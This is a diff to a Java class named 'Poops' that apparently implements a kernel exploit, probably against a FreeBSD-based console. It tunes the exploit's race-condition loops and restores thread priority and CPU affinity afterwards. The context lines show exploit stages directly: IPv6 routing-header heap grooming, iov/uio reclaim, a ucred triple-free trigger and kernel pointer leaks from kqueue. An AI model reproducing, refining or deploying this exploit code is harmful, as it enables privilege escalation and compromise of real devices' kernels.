@@ -42,6 +42,7 @@ public class Poops {
     private static final int IPV6_RTHDR_TYPE_0 = 0;
     
     private static final int RTP_PRIO_REALTIME = 2;
+    private static final int RTP_PRIO_NORMAL = 3;
     private static final int RTP_SET = 1;
     
     private static final int UIO_READ = 0;
@@ -452,6 +453,22 @@ public class Poops {
         return rtprio_thread(RTP_SET, 0, prio.address());
     }
 
+    private static int rtprioNormal() {
+        Buffer prio = new Buffer(0x4);
+        prio.putShort(0x00, (short) RTP_PRIO_NORMAL);
+        prio.putShort(0x02, (short) 0);
+        return rtprio_thread(RTP_SET, 0, prio.address());
+    }
+
+    private static int unpinThread() {
+        Buffer mask = new Buffer(CPU_SET_SIZE);
+        for (int i = 0; i < CPU_SET_SIZE; i++) {
+            mask.putByte(i, (byte) 0xFF);
+        }
+        return cpuset_setaffinity(
+                CPU_LEVEL_WHICH, CPU_WHICH_TID, 0xFFFFFFFFFFFFFFFFL, CPU_SET_SIZE, mask);
+    }
+
 
     private static int buildRthdr(Buffer buf, int size) {
         int len = ((size >> 3) - 1) & ~1;
@@ -611,6 +628,7 @@ public class Poops {
                 }
             }
             attempts++;
+            try { Thread.sleep(0); } catch (Exception ignored) {}
         }
         return false;
     }
@@ -636,6 +654,7 @@ public class Poops {
                 return j;
             }
             attempts++;
+            try { Thread.sleep(0); } catch (Exception ignored) {}
         }
         return -1;
     }
@@ -720,7 +739,11 @@ public class Poops {
         for (int i = 0; i < 32; i++) {
             // Reclaim with iov.
             iovState.signalWork(0);
-            sched_yield();
+            try {
+            Thread.sleep(0);
+        } catch (InterruptedException e) {
+            Thread.currentThread().interrupt();
+        }
 
             // Release buffers.
             write(iovSs1, tmp, Int8.SIZE);
@@ -750,7 +773,11 @@ public class Poops {
         while (true) {
             // Reclaim with iov.
             iovState.signalWork(0);
-            sched_yield();
+            try {
+            Thread.sleep(0);
+        } catch (InterruptedException e) {
+            Thread.currentThread().interrupt();
+        }
 
             leakRthdrLen.set(Int64.SIZE);
             getRthdr(ipv6Socks[twins[0]], leakRthdr, leakRthdrLen);
@@ -819,7 +846,11 @@ public class Poops {
             }
 
             close(kq);
-            sched_yield();
+            try {
+            Thread.sleep(0);
+        } catch (InterruptedException e) {
+            Thread.currentThread().interrupt();
+        }
             attempts++;
         }
         
@@ -879,7 +910,11 @@ public class Poops {
         // Reclaim with uio.
         while (true) {
             uioState.signalWork(COMMAND_UIO_READ);
-            sched_yield();
+            try {
+            Thread.sleep(0);
+        } catch (InterruptedException e) {
+            Thread.currentThread().interrupt();
+        }
 
             // Leak with other rthdr.
             leakRthdrLen.set(0x10);
@@ -914,7 +949,11 @@ public class Poops {
         while (true) {
             // Reclaim with iov.
             iovState.signalWork(0);
-            sched_yield();
+            try {
+            Thread.sleep(0);
+        } catch (InterruptedException e) {
+            Thread.currentThread().interrupt();
+        }
 
             // Leak with other rthdr.
             leakRthdrLen.set(0x40);
@@ -976,7 +1015,11 @@ public class Poops {
         // Reclaim with uio.
         while (true) {
             uioState.signalWork(COMMAND_UIO_WRITE);
-            sched_yield();
+            try {
+            Thread.sleep(0);
+        } catch (InterruptedException e) {
+            Thread.currentThread().interrupt();
+        }
 
             // Leak with other rthdr.
             leakRthdrLen.set(0x10);
@@ -1006,7 +1049,11 @@ public class Poops {
         while (true) {
             // Reclaim with iov.
             iovState.signalWork(0);
-            sched_yield();
+            try {
+            Thread.sleep(0);
+        } catch (InterruptedException e) {
+            Thread.currentThread().interrupt();
+        }
 
             // Leak with other rthdr.
             leakRthdrLen.set(0x40);
@@ -1285,6 +1332,9 @@ public class Poops {
                 iovThreads[i].join();
             }            
         } catch(Exception e) { }
+        
+        rtprioNormal();
+        unpinThread();
     }
 
     private static String getNidPath() {
@@ -1352,6 +1402,9 @@ public class Poops {
             Status.error("Exploit failed - Reboot and try again");
             return;
         }
+
+        rtprioNormal();
+        unpinThread();
         // Status.println("triggerUcredTripleFree finished");
         
         // Leak pointers from kqueue.
